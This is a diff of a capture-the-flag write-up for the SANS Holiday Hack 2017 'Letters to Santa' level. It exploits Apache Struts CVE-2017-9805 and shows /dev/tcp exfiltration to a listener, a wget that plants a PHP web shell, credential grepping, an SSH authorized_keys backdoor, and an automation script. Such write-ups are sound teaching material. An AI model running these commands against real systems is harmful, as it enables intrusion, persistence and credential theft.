@@ -31,7 +31,8 @@ The following hints were provided by Sparkle Redberry from completing the level
 
 The following SANS Pentest Blog posts were also very helpful for this challenge:
 - [[https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code][Why You Need the Skills to Tinker with Publicly Released Exploit Code]]
-  Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and CVE-2017-9805 Code: [[https://github.com/chrisjd20/cve-2017-9805.py]]
+  
+  Code: [[https://github.com/chrisjd20/cve-2017-9805.py]]
 - [[https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee Restricted][A Spot of Tee]]
   bash shell, and bypassing the I/O restriction with tee
 
@@ -59,8 +60,8 @@ If we look at the source of =l2s= the following code pops out.
 
 Let's do some recon on the hosts:
 
-#+BEGIN_SRC sh
-nmap -sC l2s.northpolechristmastown.com
+#+BEGIN_SRC
+$ nmap -sC l2s.northpolechristmastown.com
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
 Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
@@ -92,8 +93,8 @@ In addition to the hidden link for dev.northpolechristmastown.com, it is also
 present as an alternate name on the certificate of the host. Let's let nmap's
 scripts scan that as well.
 
-#+BEGIN_SRC sh
-nmap -sC dev.northpolechristmastown.com
+#+BEGIN_SRC
+$ nmap -sC dev.northpolechristmastown.com
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
 Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
@@ -127,8 +128,23 @@ Let's use the tool provided through the SANS Pentest blog,
 we land on is [[https://dev.northpolechristmastown.com/orders.xhtml]] so we'll use
 that to start from.
 
-#+BEGIN_SRC sh
-python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
+Let's check out the help:
+
+#+BEGIN_SRC
+$ ./cve-2017-9805.py
+usage: cve-2017-9805.py [-h] [-u URL] -c COMMAND
+
+optional arguments:
+  -h, --help  show this help message and exit
+  -u URL      url of target vulnerable apache struts server. Ex-
+              http://somevulnstrutsserver.com/orders.xhtml
+  -c COMMAND  command to execute against the target. Ex - /usr/bin/whoami
+#+END_SRC
+
+The example URL is =http://somevulnstrutsserver.com/orders.xhtml=. How fortituous!
+
+#+BEGIN_SRC
+$ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
 [+] Encoding Command
 [+] Building XML object
 [+] Placing command in XML object
@@ -140,7 +156,7 @@ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -
 Looks like we need to modify the program to let us see what it's
 doing by uncommenting the following line:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC python
 print request.text
 #+END_SRC
 
@@ -149,20 +165,20 @@ error with no apparent output from our =ls= command. We're dealing with a
 blind injection so we'll need to figure out a different way to get the output
 of the command. One trick we can pull is redirecting output to a special
 pseudo device, ~/dev/tcp/$host/$port~. First we'll need to set up a listener
-on our end first.
+on our end first:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 holiday@hack:~$ nc -l -p 8888
 #+END_SRC
 
 Now we run the exploit again:
 
-#+BEGIN_SRC sh
-./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls > /dev/tcp/1.2.3.4/1234"
+#+BEGIN_SRC
+./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls > /dev/tcp/1.2.3.4/8888"
 #+END_SRC
 
 The result on our end is:
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 holiday@hack:~$ nc -l -p 8888
 bin
 boot
@@ -178,7 +194,7 @@ It looks like we've been dropped into the root directory. Let's look for
 where the web root is. Normally, the default is /var/www/html on most
 linux+apache based hosts. We'll try again with the command =ls -al /var/www/html=.
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 total 1772
 drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
 drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
@@ -197,43 +213,50 @@ Let's assume for a minute that we didn't know where the web root
 was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
 that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using =find=:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 $ find / -name *.pdf
 /var/www/html/GreatBookPage2.pdf
 #+END_SRC
 
-Now on to the second.
+*** Command Execution
 
-It looks like we found our web root. Let's try out the
-web shell they suggest in the hints from Josh Wright
-[[https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php][easy-simple-php-webshell.php]].
-We'll output it to a random file in the web root then
-we can try to use it to execute commands using a browser.
+ It looks like we found our web root. Let's try out the
+ web shell they suggest in the hints from Josh Wright
+ [[https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php][easy-simple-php-webshell.php]].
+ We'll output it to a random file in the web root then
+ we can try to use it to execute commands using a browser.
 
-#+BEGIN_SRC sh
-./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php" -u https://dev.northpolechristmastown.com/orders.xhtml
-#+END_SRC
+ #+BEGIN_SRC
+ ./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php
+    https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php"
+    -u https://dev.northpolechristmastown.com/orders.xhtml
+ #+END_SRC
 
-Now we can access [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]] and look around. If we do an =ls= in this webshell, it just returns the local directory, =/var/www/html=. Nothing in here suggests that we have the webroot for the dev server, [[https://dev.northpolechristmastown.com]].
+ Now we can access
+ [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]]
+ and look around. If we do an =ls= in this webshell, it just returns
+ the local directory, =/var/www/html=. Nothing in here suggests that we
+ have the webroot for the dev server,
+ [[https://dev.northpolechristmastown.com]].
 
-Let's run =find= to see if we can find the password in our webshell.
+ Let's run =find= to see if we can find the password in our webshell.
 
-#+BEGIN_SRC sh
-find / -xdev -type f -user alabaster_snowball 2>/dev/null | xargs grep password
-#+END_SRC
+ #+BEGIN_SRC sh
+ find / -xdev -type f -user alabaster_snowball 2>/dev/null | xargs grep password
+ #+END_SRC
 
-Within the page full of results we see this:
+ Within the page full of results we see this:
 
-#+BEGIN_SRC sh
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = "stream_unhappy_buy_loss";
-#+END_SRC
+ #+BEGIN_SRC
+ /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = "stream_unhappy_buy_loss";
+ #+END_SRC
 
-A closer look at =OrderMySql.class= using =cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class= we find:
+ A closer look at =OrderMySql.class= using =cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class= we find:
 
-#+BEGIN_SRC java
-final String username = "alabaster_snowball";
-final String password = "stream_unhappy_buy_loss";
-#+END_SRC
+ #+BEGIN_SRC java
+ final String username = "alabaster_snowball";
+ final String password = "stream_unhappy_buy_loss";
+ #+END_SRC
 
 ** Solution
    :PROPERTIES:
@@ -242,7 +265,10 @@ final String password = "stream_unhappy_buy_loss";
 
 *** What is the topic of The Great Book page available in the web root of the server?
 
-Leveraging the Apache Struts vulnerability, we can run =ls= on the common web root of =/var/www/html=, and get the filename of the page, then download it via the web server. Opening it up, we see that the topic is:
+Leveraging the Apache Struts vulnerability, we can run =ls= on the
+common web root of =/var/www/html=, and get the filename of the page,
+then download it via the web server. Opening it up, we see that the
+topic is:
 
 #+BEGIN_QUOTE
 On the Topic of Flying Animals
@@ -250,7 +276,9 @@ On the Topic of Flying Animals
 
 *** What is Alabaster Snowball’s password?
 
-The trick here is just finding the right file, and the password is in cleartext in that file. We used =find= to =grep= all the files for "password".
+The trick here is just finding the right file, and the password is in
+cleartext in that file. We used =find= to =grep= all the files for
+"password".
 
 #+BEGIN_QUOTE
 =stream_unhappy_buy_loss=
@@ -285,7 +313,8 @@ touch authorized_keys
 chmod 600 authorized_keys
 
 # Append our key
-echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys
+echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | 
+  tee -a /home/alabaster_snowball/.ssh/authorized_keys
 #+END_SRC
 
 For running this via the Struts exploit, we want this all as a
@@ -294,24 +323,31 @@ necessary directory and file, and ensure the permissions are correct,
 then we'll add our key:
 
 #+BEGIN_SRC sh
-./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'
-./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
+  'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
+  'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'
 #+END_SRC
 
 Then you can ssh using your private key identity file.
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
 alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = "stream_unhappy_buy_loss";
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
 #+END_SRC
 
-Once in you are in a restricted shell but you can try to grep for alabaster's password but a regular grep against the entire system will take about 1 minute then you have to parse through the results.
+Once in you are in a restricted shell but you can try to grep for
+alabaster's password but a regular grep against the entire system will
+take about 1 minute then you have to parse through the results.
 
 *** Automate the webshell
 
-We can automate dropping a webshell and creating a mini shell to query it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in the same directory we can create a script to automate exploitation and give us a prompt to execute commands.
+We can automate dropping a webshell and creating a mini shell to query
+it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in
+the same directory we can create a script to automate exploitation and
+give us a prompt to execute commands.
 
 #+BEGIN_SRC python
 #!/usr/bin/env python
@@ -376,9 +412,11 @@ if __name__ == "__main__":
         interactive()
 #+END_SRC
 
-First we need to either rename =cve-2017-9805.py= to =cve_2017_9805.py= or create a symlink so it can be properly imported into our script. Then we can easily execute commands on l2s.
+First we need to either rename =cve-2017-9805.py= to
+=cve_2017_9805.py= or create a symlink so it can be properly imported
+into our script. Then we can easily execute commands on l2s.
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 holiday@hack:~$ ./l2s.py id
 The webshell did not exist, re-exploiting.....
 [+] Encoding Command
@@ -402,16 +440,21 @@ Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-
 
 *** Search even faster with ripgrep
 
-Ripgrep is a super fast grep replacement written in rust. It does a better job at filtering binary files, so we can run this command that finishes in about a second:
+Ripgrep is a super fast grep replacement written in rust. It does a
+better job at filtering binary files, so we can run this command that
+finishes in about a second.
 
-The following steps create a folder for ripgrep and executes the search.
+The following steps create a folder for ripgrep and executes the
+search.
 
 #+BEGIN_SRC sh
 www-data@l2s:$ mkdir /tmp/.rg
-www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | tar xzf - -C /tmp/.rg/
-www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null | xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = "stream_unhappy_buy_loss";
+www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | 
+  tar xzf - -C /tmp/.rg/
+www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null | 
+  xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
 #+END_SRC
 
 ** Common Pitfalls
@@ -446,7 +489,7 @@ The server itself housed two virtual web hosts, the Letter's to Santa applicatio
 
 Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 holiday@hack:~$ ./l2s.py "nmap -sC 10.142.0.*"
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 20:51 UTC
